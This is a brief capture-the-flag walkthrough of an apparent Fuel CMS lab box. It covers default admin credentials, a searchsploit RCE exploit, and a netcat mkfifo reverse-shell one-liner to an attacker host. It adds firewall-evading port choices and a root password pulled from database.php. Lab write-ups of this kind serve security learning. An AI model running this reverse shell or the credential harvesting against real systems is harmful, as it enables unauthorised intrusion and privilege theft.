# Ignite

* We find in *robots.txt* the /fuel file
* On the main page we find that the user and pass for the login are *admin* and *admin*
* Using *seachsploit* we find one that gives the attacker RCE once authentificated
* Running the .py exploit and modifying it a bit to run with python3 we get a weird shell
* We can serve ourserves a netcat reverse shell with the following payload from PayloadsAllTheThings
* The port should be something like 80 or 443 or 53(DNS port), so it won't be blocked by the firewall
```bash
# using the exploit's shell
cmd: rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f
```
```bash
# once a reverse shell is obtained
$ python -c 'import pty;pty.spawn("/bin/bash")'
```
* Once authentificated, we find the root password in a config file
* */var/www/html/fuel/application/config* -> the location of config files
```bash
www-data@ubuntu:/var/www/html/fuel/application/config$ cat database.php
```
* This contains a password for root for the db, which is also the password on the system
